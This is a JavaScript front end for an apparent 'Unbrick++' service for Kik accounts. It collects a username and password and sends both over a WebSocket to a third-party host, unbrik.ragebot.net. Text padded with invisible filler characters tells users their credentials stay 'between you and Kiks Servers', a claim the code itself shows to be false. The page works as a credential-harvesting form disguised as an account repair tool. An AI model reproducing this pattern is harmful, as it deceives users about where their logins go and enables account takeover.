const form = document.querySelector('#form');
    const button = document.querySelector('#go');
    const log = document.querySelector('#log');
    const usernameInput = form.username;
    const passwordInput = form.password;
	printLog();

    function verify() {
        const username = usernameInput.value;
        const password = passwordInput.value.length >= 6;
        if (username && password) {
            button.removeAttribute('disabled');
            return true;
        } else {
            button.setAttribute('disabled', '');
            return false;
        }
    }

    verify();

    function sanitizeUsername() {
        usernameInput.value = usernameInput.value.replace(/[^\w_.]/g, '');
    }

    function clearLog() {
        log.innerHTML = '';
    }

    function printLog() {
        log.innerHTML = 'Unbrick++ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤWARNING: Your account will be logged out, and your messages will be lost in the process!ㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤㅤYour Credentials are perfectly Safe between you and Kiks Servers.';
    }

    function logMessage(message) {
        const node = document.createElement('p');
        node.textContent = message;
        log.appendChild(node);
    }

    form.addEventListener('submit', e => {
        e.preventDefault();
        if (!verify()) return;
        button.setAttribute('disabled', '');
        log.setAttribute('active', '');
        clearLog();
        const username = form.username.value;
        const password = form.password.value;
        logMessage("Connecting to Unbrick++ service...")
        const ws = new WebSocket('wss://unbrik.ragebot.net/unbrik');
        ws.addEventListener('open', () => {
            logMessage("Successfully Connected!")
            ws.send(JSON.stringify({
                username,
                password
            }))
        });
        ws.addEventListener('message', ev => {
            console.log(ev);
            logMessage('[Unbrick++] ' + ev.data);
        });
        ws.addEventListener('close', ev => {
            verify();
            log.removeAttribute('active');
        });
        ws.addEventListener('error', ev => {
            console.log(ev);
        });
    });
